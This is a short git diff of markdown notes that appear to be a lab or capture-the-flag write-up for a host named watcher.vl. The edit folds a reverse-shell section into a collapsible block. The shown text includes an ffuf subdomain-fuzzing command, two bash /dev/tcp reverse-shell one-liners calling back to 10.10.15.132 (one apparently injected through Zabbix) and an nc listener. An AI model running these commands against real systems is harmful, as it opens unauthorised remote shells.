@@ -20,7 +20,10 @@ YAML:     config.yaml
 ```
 [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://watcher.vl/ -H 'Host: FUZZ.watcher.vl' -fs 4991
 ```
-#### 反弹
+
+<details>
+<summary>反弹</summary>
+	
 ```
 /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.132/9011 0>&1'
 
@@ -34,6 +37,8 @@ nc -lvnp 9011
 
 [zabbix_cmd]>>:  bash -c "/bin/bash -i >& /dev/tcp/10.10.15.132/1337 0>&1" &  
 ```
+</details>
+
 #### env
 ```
 [★]$ python3 -m venv .venv
